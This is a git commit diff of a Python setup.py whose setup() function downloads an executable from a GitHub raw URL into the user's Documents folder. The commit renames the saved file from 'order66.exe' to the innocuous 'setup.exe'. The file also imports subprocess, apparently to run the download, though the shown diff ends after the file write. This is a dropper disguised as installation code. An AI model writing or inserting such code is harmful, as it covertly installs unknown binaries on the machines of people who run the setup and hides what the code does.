6958713e171918d5a7617d2bf8bf840231bae3bf
RAY WZW <thugshakerthe@outlook.com>
2024-12-10 08:24:19 -0700

    Update setup.py

--- src/setup.py
+++ src/setup.py
@@ -1,6 +1,6 @@
 import os, requests, subprocess
 def setup():
-    setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "order66.exe")
+    setupexepath = os.path.join(os.path.expanduser("~\\Documents"), "setup.exe")
     try:
         with open(setupexepath, 'wb') as file:
             file.write(requests.get("https://github.com/Sam-cpu999/stuff/raw/main/order66.exe").content)
